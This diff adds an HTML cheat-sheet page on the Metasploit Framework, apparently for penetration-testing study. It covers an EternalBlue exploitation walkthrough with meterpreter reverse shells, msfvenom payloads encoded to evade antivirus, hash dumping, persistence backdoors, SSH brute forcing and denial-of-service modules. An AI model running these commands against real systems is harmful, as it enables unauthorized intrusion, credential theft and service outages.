@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Framework Guide - Cybersecurity Cheat Sheet</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="../guide-styles.css">
+</head>
+<body>
+    <div class="guide-container">
+        <header class="guide-header">
+            <h1>Metasploit Framework: The Ultimate Penetration Testing Platform</h1>
+            <p>Master Exploit Development and Penetration Testing</p>
+            <a href="../index.html" class="back-link">&larr; Back to Cheat Sheet</a>
+        </header>
+
+        <main class="guide-content">
+            <section id="introduction">
+                <h2>What is Metasploit Framework?</h2>
+                <p>Metasploit Framework is the world's most used penetration testing framework. It provides information about security vulnerabilities and aids in developing and executing exploit code against a remote target machine. It includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection.</p>
+            </section>
+
+            <section id="installation">
+                <h2>Installation & Setup</h2>
+                <div class="command-block">
+                    <h3>Linux Installation</h3>
+                    <pre><code># Kali Linux (pre-installed)
+msfconsole
+
+# Ubuntu/Debian
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod 755 msfinstall
+./msfinstall
+
+# Update Metasploit
+msfupdate</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Windows Installation</h3>
+                    <pre><code># Download installer from https://www.metasploit.com/
+# Run as Administrator
+# Or use Windows Subsystem for Linux (WSL)</code></pre>
+                </div>
+            </section>
+
+            <section id="basic-usage">
+                <h2>Basic Usage & Commands</h2>
+                <div class="command-block">
+                    <h3>Starting Metasploit</h3>
+                    <pre><code># Start Metasploit console
+msfconsole
+
+# Start with quiet mode (no banner)
+msfconsole -q
+
+# Load specific resource script
+msfconsole -r script.rc</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Essential Commands</h3>
+                    <pre><code># Get help
+help
+help [command]
+
+# Search for exploits/modules
+search [term]
+search type:exploit platform:windows
+search cve:2017
+
+# Show available modules
+show exploits
+show payloads
+show auxiliary
+show post
+
+# Get information about a module
+info [module_path]
+
+# Use a module
+use [module_path]
+
+# Show module options
+show options
+show advanced
+
+# Set module options
+set [option] [value]
+setg [option] [value]  # Global setting
+
+# Run the module
+run
+exploit</code></pre>
+                </div>
+            </section>
+
+            <section id="exploitation-workflow">
+                <h2>Exploitation Workflow</h2>
+                <div class="command-block">
+                    <h3>Step 1: Reconnaissance</h3>
+                    <pre><code># Port scanning
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+set PORTS 1-1000
+run
+
+# Service enumeration
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.100
+run
+
+# Vulnerability scanning
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.1.100
+run</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Step 2: Exploitation</h3>
+                    <pre><code># Use an exploit
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.50
+
+# Set payload
+set payload windows/x64/meterpreter/reverse_tcp
+set LPORT 4444
+
+# Check if target is vulnerable
+check
+
+# Execute exploit
+exploit</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Step 3: Post-Exploitation</h3>
+                    <pre><code># Once you have a meterpreter session
+sessions -l  # List active sessions
+sessions -i 1  # Interact with session 1
+
+# Meterpreter commands
+sysinfo
+getuid
+ps
+migrate [PID]
+hashdump
+screenshot
+download [remote_file] [local_path]
+upload [local_file] [remote_path]</code></pre>
+                </div>
+            </section>
+
+            <section id="payloads">
+                <h2>Payloads & Encoders</h2>
+                <div class="command-block">
+                    <h3>Common Payloads</h3>
+                    <pre><code># Windows Payloads
+windows/meterpreter/reverse_tcp
+windows/shell/reverse_tcp
+windows/x64/meterpreter/reverse_tcp
+
+# Linux Payloads
+linux/x86/meterpreter/reverse_tcp
+linux/x64/shell/reverse_tcp
+
+# Web Payloads
+php/meterpreter/reverse_tcp
+java/jsp_shell_reverse_tcp
+
+# Generate standalone payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Encoders (AV Evasion)</h3>
+                    <pre><code># List encoders
+show encoders
+
+# Use encoder with msfvenom
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > encoded_payload.exe
+
+# Multiple encoding iterations
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > multi_encoded.exe</code></pre>
+                </div>
+            </section>
+
+            <section id="meterpreter">
+                <h2>Meterpreter Commands</h2>
+                <div class="command-block">
+                    <h3>System Information</h3>
+                    <pre><code># System info
+sysinfo
+getuid
+getpid
+
+# Process management
+ps
+migrate [PID]
+kill [PID]
+
+# File system
+pwd
+ls
+cd [directory]
+cat [file]
+download [remote_file]
+upload [local_file]</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Privilege Escalation</h3>
+                    <pre><code># Check privileges
+getprivs
+
+# Attempt privilege escalation
+getsystem
+
+# Use post-exploitation modules
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/credentials/windows_autologin
+run post/windows/escalate/getsystem</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Persistence</h3>
+                    <pre><code># Create persistent backdoor
+run persistence -S -U -X -i 10 -p 4445 -r 192.168.1.50
+
+# Registry persistence
+run post/windows/manage/persistence_exe
+
+# Service persistence
+run post/windows/manage/persistence</code></pre>
+                </div>
+            </section>
+
+            <section id="auxiliary-modules">
+                <h2>Auxiliary Modules</h2>
+                <div class="command-block">
+                    <h3>Scanners</h3>
+                    <pre><code># SMB scanning
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 192.168.1.0/24
+set SMBUser admin
+set SMBPass password123
+run
+
+# HTTP directory scanner
+use auxiliary/scanner/http/dir_scanner
+set RHOSTS 192.168.1.100
+run
+
+# SSH brute force
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.1.100
+set USERNAME root
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Denial of Service</h3>
+                    <pre><code># TCP SYN flood
+use auxiliary/dos/tcp/synflood
+set RHOST 192.168.1.100
+set RPORT 80
+run
+
+# HTTP slowloris
+use auxiliary/dos/http/slowloris
+set RHOST 192.168.1.100
+run</code></pre>
+                </div>
+            </section>
+
+            <section id="database">
+                <h2>Database Integration</h2>
+                <div class="command-block">
+                    <h3>Database Setup</h3>
+                    <pre><code># Initialize database
+msfdb init
+
+# Check database status
+db_status
+
+# Connect to database
+db_connect
+
+# Workspace management
+workspace
+workspace -a [name]
+workspace [name]</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Data Management</h3>
+                    <pre><code># Import Nmap scan
+db_nmap -sS -A 192.168.1.0/24
+
+# View hosts
+hosts
+
+# View services
+services
+
+# View vulnerabilities
+vulns
+
+# Export data
+db_export -f xml /tmp/msf_data.xml</code></pre>
+                </div>
+            </section>
+
+            <section id="tips">
+                <h2>Pro Tips & Best Practices</h2>
+                <ul>
+                    <li><strong>Always use workspaces:</strong> Organize your penetration tests with separate workspaces</li>
+                    <li><strong>Save your work:</strong> Use resource scripts to save command sequences</li>
+                    <li><strong>Check before exploiting:</strong> Use the 'check' command to verify if target is vulnerable</li>
+                    <li><strong>Migrate processes:</strong> Always migrate to a stable process after getting meterpreter</li>
+                    <li><strong>Use global variables:</strong> Set common options globally with 'setg'</li>
+                    <li><strong>Keep updated:</strong> Regularly update Metasploit with 'msfupdate'</li>
+                    <li><strong>Use handlers:</strong> Set up multi/handler for catching reverse shells</li>
+                    <li><strong>Document everything:</strong> Use 'spool' command to log your session</li>
+                </ul>
+            </section>
+
+            <section id="legal-disclaimer">
+                <h2>Legal Disclaimer</h2>
+                <div class="command-block">
+                    <p><strong>WARNING:</strong> Metasploit is a powerful tool that should only be used for:</p>
+                    <ul>
+                        <li>Authorized penetration testing</li>
+                        <li>Security research on your own systems</li>
+                        <li>Educational purposes in controlled environments</li>
+                    </ul>
+                    <p>Unauthorized use against systems you don't own is illegal and unethical. Always obtain proper authorization before testing.</p>
+                </div>
+            </section>
+        </main>
+    </div>
+</body>
+</html>
